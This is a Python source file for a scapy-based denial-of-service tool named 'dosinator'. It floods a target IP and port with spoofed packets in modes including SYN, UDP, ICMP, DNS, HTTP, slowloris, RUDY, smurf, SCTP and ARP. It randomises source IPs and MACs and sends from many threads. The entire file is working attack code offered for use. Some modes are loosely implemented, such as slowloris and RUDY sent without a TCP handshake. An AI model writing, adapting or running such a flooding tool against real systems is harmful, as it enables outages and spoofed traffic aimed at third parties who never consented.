#! /usr/bin/env python3
import time
import random
import argparse
import threading
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.layers.sctp import SCTP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import TCP, UDP, ICMP, IP

from source.dosinatorfiglet import dosinatorfiglet

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))
def generate_random_mac():
    return ":".join([format(random.randint(0, 255), '02x') for _ in range(6)])
def get_mac_address(ip_address):
    arp = ARP(pdst=ip_address)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=False)
    if result:
        return result[0][0][1].hwsrc
    else:
        return None


def read_data_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read()
    except Exception as e:
        print(f"Error while reading data from file: {e}")
        return None

def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data=None, pcap_file=None):
    try:
        source_ip = spoof_ip() if spoof_ip else generate_random_ip()
        source_port = RandShort()
        source_mac = generate_random_mac()


        if custom_data:
            payload = custom_data.encode()
        else:
            payload = Raw(RandString(size=packet_size))

        if attack_mode == "syn":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='S') / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "udp":
            packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "icmp":
            packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "dns":
            domain = f"{generate_random_ip()}.com"
            packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port) / DNS(rd=1, qd=DNSQR(qname=domain)) / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "os_fingerprint":
            packet = IP(src=source_ip, dst=target_ip) / ICMP() / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "http":
            headers = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port) / headers / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "slowloris":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port) / Raw("X-a: b\r\n") / payload
        elif attack_mode == "smurf":
            packet = IP(src=source_ip, dst=target_ip) / ICMP(type=8, code=0) / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "sctp":
            packet = IP(src=source_ip, dst=target_ip) / SCTP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "rudy":
            headers = "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n".format(target_ip, packet_size)
            payload = "X-a: b\r\n"
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='A') / headers / payload / Raw(RandString(size=packet_size))
        elif attack_mode == "arp":
            target_mac = get_mac_address(target_ip)
            if not target_mac:
                print(f"Could not resolve MAC address for {target_ip}. ARP flooding failed.")
                return
            elif arp_mode == "request":
                packet = ARP(op=1, pdst=target_ip, psrc=source_ip, hwsrc=source_mac) / payload / Raw(RandString(size=packet_size))
            elif arp_mode == "reply":
                packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac) / payload / Raw(RandString(size=packet_size))
            else:
                print("Invalid ARP mode.")
                return
        else:
            print("Invalid attack mode.")
            return

        if pcap_file:
            wrpcap(pcap_file, packet, append=True)

        send(packet, verbose=False)
    except Exception as e:
        print(f"Error while sending packet: {e}")

stop_threads = False

def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, custom_data=None, pcap_file=None):
    global stop_threads

    print(f"Target IP        : {target_ip}")
    print(f"Target Port      : {target_port}")
    print(f"Number of Packets: {num_packets}")
    print(f"Packet Size      : {packet_size} bytes")
    print(f"Attack Rate      : {attack_rate} packets/second")
    print(f"Duration         : {duration} seconds")
    print(f"Attack Mode      : {attack_mode}")
    print(f"Spoof IP         : {spoof_ip.__name__ if spoof_ip else 'Default'}")
    print(f"ARP Mode         : {arp_mode if attack_mode == 'arp' else 'N/A'}")
    print()

    delay = 1 / attack_rate if attack_rate > 0 else 0
    start_time = time.time()
    sent_packets = 0

    def send_packets():
        nonlocal sent_packets
        while not stop_threads:
            if num_packets and sent_packets >= num_packets:
                break
            if duration and time.time() - start_time >= duration:
                break

            send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data, pcap_file)
            sent_packets += 1
            print(f"\rSent packet {sent_packets}", end="")
            time.sleep(delay)

    threads = []
    try:
        for _ in range(attack_rate):
            thread = threading.Thread(target=send_packets)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()
    except Exception as e:
        print(f"Error during attack: {e}")
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        stop_threads = True
        for thread in threads:
            thread.join()
    finally:
        print("\nAttack completed.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=dosinatorfiglet())
    parser.add_argument('-t', '--target',  required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, help='Target port number (required for non-ARP attacks)')
    parser.add_argument('-np', '--num_packets', type=int, default=500, help='Number of packets to send (default: 500)')
    parser.add_argument('-ps', '--packet_size', type=int, default=64, help='Packet size in bytes (default: 64)')
    parser.add_argument('-ar', '--attack_rate', type=int, default=10, help='Attack rate in packets/second (default: 10)')
    parser.add_argument('-d ', '--duration', type=int, help='Duration of the attack in seconds')
    parser.add_argument('--attack-mode', choices=["syn", "sctp", "udp", "icmp", "http", "dns", "os_fingerprint", "slowloris", "smurf", "rudy", "arp"], default="syn", help='Attack mode (default: syn)')
    parser.add_argument('-sp', '--spoof-ip', default=None, help='Spoof IP address')
    parser.add_argument('--data', type=str, default=None, help='Custom data string to send')
    parser.add_argument('--file', type=str, default=None, help='File path to read data from')
    parser.add_argument('--pcap', type=str, default=None, help='PCAP file path to save outgoing packets')
    parser.add_argument('--arp-mode', choices=["request", "reply"], default="request", help='ARP mode (default: request)')

    args = parser.parse_args()

    target_ip = args.target
    target_port = args.port
    num_packets = args.num_packets
    packet_size = args.packet_size
    attack_rate = args.attack_rate
    duration = args.duration
    attack_mode = args.attack_mode
    data = args.data
    file_path = args.file
    pcap_file = args.pcap
    arp_mode = args.arp_mode

    if args.spoof_ip == "random":
        spoof_ip = generate_random_ip
    else:
        spoof_ip = lambda: args.spoof_ip if args.spoof_ip else None

    if file_path:
        data = read_data_from_file(file_path)

    if not target_ip:
        print("Target IP address is required.")
    elif attack_mode != "arp" and not target_port:
        print("Port number is required for non-ARP attacks.")
    else:
        dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, data, pcap_file)
